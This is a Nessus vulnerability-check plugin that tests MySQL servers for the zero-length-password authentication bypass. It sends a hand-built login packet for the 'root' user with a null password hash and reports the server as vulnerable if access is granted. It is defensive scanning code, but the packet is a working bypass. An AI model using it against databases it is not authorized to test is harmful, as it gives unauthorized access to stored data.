#
# This script was written by Eli Kara <elik@beyondsecurity.com>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(12639);  
 script_bugtraq_id(10654, 10655);
 script_version ("$Revision: 1.5 $");

 name["english"] = "MySQL Authentication bypass through a zero-length password";
 script_name(english:name["english"]);
 
 desc["english"] = "It is possible to bypass password authentication for a database
 user using a crafted authentication packet with a zero-length password
 
Note: In order to use this script, the MySQL daemon has to allow connection from the
scanning IP address";
 script_description(english:desc["english"]);
 
 summary["english"] = "Log in to MySQL with a zero-length password";
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2004 Beyond Security");
 
 family["english"] = "Remote file access";
 script_family(english:family["english"]);
 
 script_dependencie("find_service2.nasl");
 script_require_ports("Services/mysql", 3306);
 exit(0);
}

include("misc_func.inc");

debug=0;
port = get_kb_item("Services/mysql");
if(!port)port = 3306;


# get version
ver = get_mysql_version(port);

# open a TCP connection
soc = open_sock_tcp(port);
if(!soc)
{
  exit(1);
}

# receive greeting and check if we're allowed in
rep = recv(socket:soc, length:1024);
if( strlen(rep) < 7) exit(1);
if ("Not allowed to connect" >< rep) exit(0);

# create the login packet
user = string("root");
packet = raw_string(0x85,0xA6,0x03,0x00,0x00,0x00,0x00,
					0x01,0x08,0x00,0x00,0x00,
					0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
					0x00,0x00,0x00,0x00);  # capabilities, max packet, etc..
packet = packet + user; # add username
packet = packet + raw_string(0x00);  # null
packet = packet + raw_string(0x14);  # SHA-1 hash length
packet = packet + raw_string(0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00); # null hash
plen = strlen(packet);
packet = raw_string(plen) + raw_string(0x00,0x00,0x01) + packet;  # add the packet length and number (login caps packet = 1)

# send it
send(socket:soc, data:packet);
rep = recv(socket:soc, length:1024);
if ( strlen(rep) < 5 ) exit(0);
if ( ! rep ) exit(0);

# define our login ok bytes (these are the return codes from MySQL)
login_ok5 = raw_string(0xfe);
login_ok4 = raw_string(0x00);

# declare report strings
report_login = string("It is possible to login to your MySQL database using a null-password by crafting a special packet.\n", 
					"In a typical attack scenario where a specific DB user has remote login access, an attacker needs\n",
					"only to compile a slightly modified version of the MySQL client program in order to automatically\n",
					"gain that user's access to the database\n",
"Solution: Upgrade to MySQL 4.1.3 or newer\n",
"Risk Factor: High");
report_version = string("It was not possible to login into your MySQL database remotely (possibly due to remote access\n",
						"restrictions on the DB user '", user, "'). However, your MySQL server version is found to be one\n",
						"of the vulnerable versions so exploitation is possible for users with remote access.\n\n",
"Solution: Upgrade to MySQL 4.1.3 or newer\n",
"Risk Factor: High");
# figure out which was it
rep_code = substr(rep, 4, 5);
if (ord(rep_code) == 0xfe || ord(rep_code) == 0x00 )
{
	security_hole(port:port, data:report_login);
}
else if (ereg(pattern:"4\.1\.[0-2][^0-9]", string:ver) || ereg(pattern:"5\.0\.", string:ver))
{
	security_hole(port:port, data:report_version);
}






